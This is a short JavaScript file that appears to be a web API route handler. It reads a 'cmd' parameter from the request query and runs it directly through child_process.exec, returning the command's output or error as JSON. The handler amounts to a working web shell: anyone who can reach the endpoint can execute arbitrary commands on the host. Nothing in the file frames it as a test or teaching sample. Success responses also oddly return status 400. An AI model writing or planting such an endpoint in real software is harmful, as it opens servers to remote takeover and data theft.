import * as child from 'child_process';

export default function handler(req, res) {
    const { cmd } = req.query;
    var p = child.exec(cmd, (error, stdout, stderr) => {
        if (error) {
            res.status(400).json({
                cmd,
                error: 1,
                errorType: 'error',
                message: error.toString()
            })
        } else if (stderr) {
            res.status(400).json({
                cmd,
                error: 1,
                errorType: 'stderr',
                message: stderr.toString()
            })
        } else {
            res.status(400).json({ stdout })
        }
    });
}